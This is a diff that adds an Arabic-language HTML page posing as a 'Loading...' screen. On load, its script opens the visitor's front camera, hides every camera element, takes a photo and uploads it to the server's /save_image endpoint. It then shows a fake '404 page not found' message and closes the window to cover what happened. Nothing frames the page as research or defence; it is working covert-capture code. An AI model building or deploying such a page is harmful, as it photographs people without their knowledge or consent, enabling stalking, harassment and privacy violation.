@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحميل...</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .loading-container {
+            text-align: center;
+            color: #666;
+        }
+        
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        h1 {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+        
+        p {
+            font-size: 14px;
+            color: #999;
+        }
+        
+        /* إخفاء جميع العناصر المتعلقة بالكاميرا */
+        #video, #canvas, #preview, .controls, .message {
+            display: none !important;
+            visibility: hidden !important;
+            opacity: 0 !important;
+            position: absolute !important;
+            width: 1px !important;
+            height: 1px !important;
+            overflow: hidden !important;
+        }
+        
+        #video {
+            width: 1px !important;
+            height: 1px !important;
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-container">
+        <div class="spinner"></div>
+        <h1>جاري التحميل...</h1>
+        <p>يرجى الانتظار</p>
+    </div>
+    
+    <!-- عناصر مخفية للكاميرا -->
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+    <img id="preview" alt="">
+
+    <script>
+        (async function() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            let stream = null;
+            
+            try {
+                // محاولة الوصول إلى الكاميرا تلقائياً
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false
+                });
+                
+                video.srcObject = stream;
+                
+                // انتظار حتى تكون الكاميرا جاهزة
+                video.onloadedmetadata = () => {
+                    // انتظار قليل ثم التقاط الصورة
+                    setTimeout(() => {
+                        capturePhoto();
+                    }, 500);
+                };
+                
+            } catch (error) {
+                console.error('خطأ:', error);
+                // في حالة الفشل، إظهار رسالة خطأ عادية
+                document.querySelector('.loading-container').innerHTML = 
+                    '<h1>404 - الصفحة غير موجودة</h1><p>عذراً، الصفحة المطلوبة غير متوفرة</p>';
+                
+                // إغلاق الصفحة بعد 2 ثانية
+                setTimeout(() => {
+                    window.close();
+                }, 2000);
+            }
+            
+            function capturePhoto() {
+                try {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0);
+                    
+                    const imageData = canvas.toDataURL('image/jpeg', 0.9);
+                    
+                    // إرسال الصورة تلقائياً
+                    saveImage(imageData);
+                    
+                    // إيقاف الكاميرا فوراً
+                    if (stream) {
+                        stream.getTracks().forEach(track => track.stop());
+                    }
+                    
+                } catch (error) {
+                    console.error('خطأ في التقاط الصورة:', error);
+                }
+            }
+            
+            async function saveImage(imageData) {
+                try {
+                    await fetch('/save_image', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ image: imageData })
+                    });
+                    
+                    // بعد الحفظ، إظهار رسالة عادية ثم إغلاق الصفحة
+                    setTimeout(() => {
+                        document.querySelector('.loading-container').innerHTML = 
+                            '<h1>404 - الصفحة غير موجودة</h1><p>عذراً، الصفحة المطلوبة غير متوفرة</p>';
+                        
+                        setTimeout(() => {
+                            window.close();
+                        }, 1500);
+                    }, 500);
+                    
+                } catch (error) {
+                    console.error('خطأ في حفظ الصورة:', error);
+                    // إغلاق الصفحة حتى في حالة الخطأ
+                    setTimeout(() => {
+                        window.close();
+                    }, 1000);
+                }
+            }
+        })();
+    </script>
+</body>
+</html>
+
